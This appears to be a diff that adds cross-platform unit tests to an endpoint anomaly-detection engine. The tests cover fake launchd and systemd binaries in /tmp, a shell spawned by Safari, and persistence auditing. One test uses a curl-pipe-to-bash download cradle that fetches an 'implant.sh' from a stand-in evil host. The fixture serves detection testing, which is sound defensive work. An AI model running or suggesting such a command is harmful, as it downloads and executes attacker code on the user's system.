@@ -217,5 +217,50 @@ class TestEnrichedSecurity(unittest.TestCase):
         self.assertEqual(d["parent"]["name"], "services.exe")
 
 
+    def test_cross_platform_canonical_paths(self):
+        """Test canonical path mismatch on macOS and Linux."""
+        engine_mac = AnomalyDetectionEngine(platform_name="darwin")
+        bad_launchd = ProcessInfo(pid=1001, name="launchd", path="/tmp/launchd")
+        findings_mac = engine_mac.analyze_process(bad_launchd)
+        self.assertTrue(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" for f in findings_mac))
+
+        good_launchd = ProcessInfo(pid=1, name="launchd", path="/sbin/launchd")
+        findings_mac_good = engine_mac.analyze_process(good_launchd)
+        self.assertFalse(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" for f in findings_mac_good))
+
+        engine_lin = AnomalyDetectionEngine(platform_name="linux")
+        bad_systemd = ProcessInfo(pid=2001, name="systemd", path="/tmp/systemd")
+        findings_lin = engine_lin.analyze_process(bad_systemd)
+        self.assertTrue(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" for f in findings_lin))
+
+    def test_cross_platform_exploit_lineage(self):
+        """Test browser/web server spawning shell on macOS/Linux."""
+        engine_mac = AnomalyDetectionEngine(platform_name="darwin")
+        proc_safari_bash = ProcessInfo(
+            pid=3001,
+            name="bash",
+            parent={"pid": 2000, "name": "safari"},
+        )
+        findings = engine_mac.analyze_process(proc_safari_bash)
+        self.assertTrue(any(f.anomaly_type == "ANOMALOUS_PARENT_LINEAGE" for f in findings))
+
+    def test_cross_platform_curl_pipe_bash(self):
+        """Test detection of curl/wget download cradles."""
+        engine_mac = AnomalyDetectionEngine(platform_name="darwin")
+        proc_curl = ProcessInfo(
+            pid=4001,
+            name="bash",
+            command_line="curl -sSL https://evil.example.com/implant.sh | bash",
+        )
+        findings = engine_mac.analyze_process(proc_curl)
+        self.assertTrue(any(f.anomaly_type == "DOWNLOAD_AND_EXECUTE_CRADLE" for f in findings))
+
+    def test_persistence_auditor_runs_cross_platform(self):
+        """Verify PersistenceAuditor runs cleanly and returns list of entries."""
+        findings = PersistenceAuditor.audit()
+        self.assertIsInstance(findings, list)
+
+
 if __name__ == "__main__":
     unittest.main()
+
